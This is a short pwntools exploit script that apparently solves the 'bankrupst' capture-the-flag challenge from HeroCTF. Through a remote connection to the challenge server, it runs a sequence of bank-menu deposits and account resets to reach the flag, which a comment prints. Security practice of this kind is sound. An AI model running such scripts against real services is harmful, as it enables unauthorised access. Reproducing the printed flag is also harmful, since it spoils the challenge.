#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./bankrupst", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("pwn.heroctf.fr", 6001)

p.sendlineafter(b"Choose an option: ", b"1")

for i in range(10):
    p.sendlineafter(b"Choose an option:", b"2")
    p.sendlineafter(b"deposit?", b"100")

p.sendlineafter(b"Choose an option: ", b"6")

p.sendlineafter(b"Choose an option: ", b"1")

for i in range(4):
    p.sendlineafter(b"Choose an option:", b"2")
    p.sendlineafter(b"deposit?", b"100")

p.sendlineafter(b"Choose an option: ", b"4")

p.readuntil(b"member!\n")

log.success(p.readline().decode()) # Hero{B4nkk_Rupst3dDd!!1x33x7}
